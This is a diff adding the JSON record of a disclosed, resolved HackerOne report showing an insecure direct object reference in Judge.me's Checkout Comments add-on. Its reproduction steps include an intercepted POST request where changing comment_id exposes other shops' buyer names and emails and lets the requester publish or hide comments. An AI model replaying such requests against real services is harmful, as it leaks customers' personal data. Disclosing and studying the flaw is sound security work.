@@ -1,0 +1,134 @@
+{
+  "id": 1410498,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDEwNDk4",
+  "url": "https://hackerone.com/reports/1410498",
+  "title": "IDOR: leak buyer info & Publish/Hide foreign comments",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-11-26T00:21:26.491Z",
+  "submitted_at": "2021-11-26T00:21:26.546Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "chupa__chups",
+    "url": "/chupa__chups",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ptgii9y5pkpzci78zrcaghlb8vzh/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50842,
+    "url": "https://hackerone.com/judgeme",
+    "handle": "judgeme",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/nlko0t9tbnnnvrnboo0f2qpliu7t/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/nlko0t9tbnnnvrnboo0f2qpliu7t/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Judge.me ",
+      "twitter_handle": "",
+      "website": "https://judge.me",
+      "about": "Judge.me powers the product reviews for e-commerce stores. Our apps help you collect and display reviews on Shopify, WooCommerce and BigCommerce."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-03-31T14:04:41.478Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-03-31T07:29:52.601Z",
+  "team_member_agreed_on_going_public_at": "2022-03-31T14:04:41.316Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "HI @judgeme!\nI noticed that the attacker can learn email users who left feedback at the time of buying.\n\nStep to reproduce:\n\n1. Login to our store and install your 'Checkout Comments' addon\n2. Make fake order in or store and write a comment\n\n███\n\n3. Then go to our Shopify `/admin/apps/checkout-comments/extensions/checkout_comments/comments`\n4. Publish our comment and Intercept request with burp. Send request to Repeater. Request example:\n\nPOST /extensions/checkout_comments/curate_comment HTTP/1.1\nHost: judge.me\nCookie: _judgeme_session=████████████████; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50\nX-Csrf-Token: ████==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 23\nOrigin: https://judge.me\nTe: trailers\nConnection: close\n\ncomment_id=1&curated=ok\n\n\n\n5. Edit `comment_id=random_id` and in Response we can see buyer information (for example):\n\n\n`{\"comment\":{\"id\":1,\"content\":\"classic dress watch for weddings\",\"created_at\":\"over 3 years ago\",\"product\":{\"title\":\"Dress Watch\",\"url\":\"https://████.myshopify.com/products/dress-watch\"},\"buyer\":{\"name\":\"F F\",\"email\":\"██████████@gmail.com\"},\"published_status\":true,\"published_status_text\":\"Published\",\"curated\":\"ok\"}}`\n\n\n██████\n\n\n\nVideo POC:\n\n\n\n██████\n\n## Impact\n\nBuyer information leaks and other",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 44,
+  "voters": [
+    "datsuraku147",
+    "napkin",
+    "conda",
+    "santoryuhunter",
+    "alp",
+    "shreyaschavhan",
+    "vormir",
+    "20kilograma",
+    "sudi",
+    "imtheking",
+    "and 34 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 57459,
+    "asset_type": "URL",
+    "asset_identifier": "judge.me",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
